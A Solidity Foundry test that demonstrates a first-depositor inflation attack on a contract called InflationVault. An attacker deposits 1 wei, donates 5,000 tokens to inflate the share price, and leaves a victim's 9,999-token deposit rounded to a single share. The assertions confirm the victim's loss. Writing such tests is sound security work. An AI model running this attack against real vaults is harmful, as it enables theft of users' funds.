// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {InflationVault} from "../src/InflationVault.sol";
import {MockERC20} from "../src/mocks/MockERC20.sol";

contract InflationVaultTest is Test {
    MockERC20 internal asset;
    InflationVault internal vault;
    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");

    function setUp() public {
        asset = new MockERC20("Vault Asset", "VAT");
        vault = new InflationVault(address(asset));

        asset.mint(attacker, 5_000 ether + 1);
        asset.mint(victim, 10_000 ether);
    }

    function test_FirstDepositorInflationStealsDeposit() public {
        vm.startPrank(attacker);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(1);
        // 1 wei share + large donation inflates the price; victim is rounded to 1 share.
        asset.transfer(address(vault), 5_000 ether);
        vm.stopPrank();

        vm.startPrank(victim);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(9_999 ether);
        vm.stopPrank();

        uint256 attackerAssets = _previewWithdraw(attacker);
        uint256 victimAssets = _previewWithdraw(victim);

        assertGt(attackerAssets, 5_000 ether);
        assertLt(victimAssets, 9_999 ether);
    }

    function _previewWithdraw(address user) internal view returns (uint256) {
        return (vault.sharesOf(user) * asset.balanceOf(address(vault))) / vault.totalShares();
    }
}
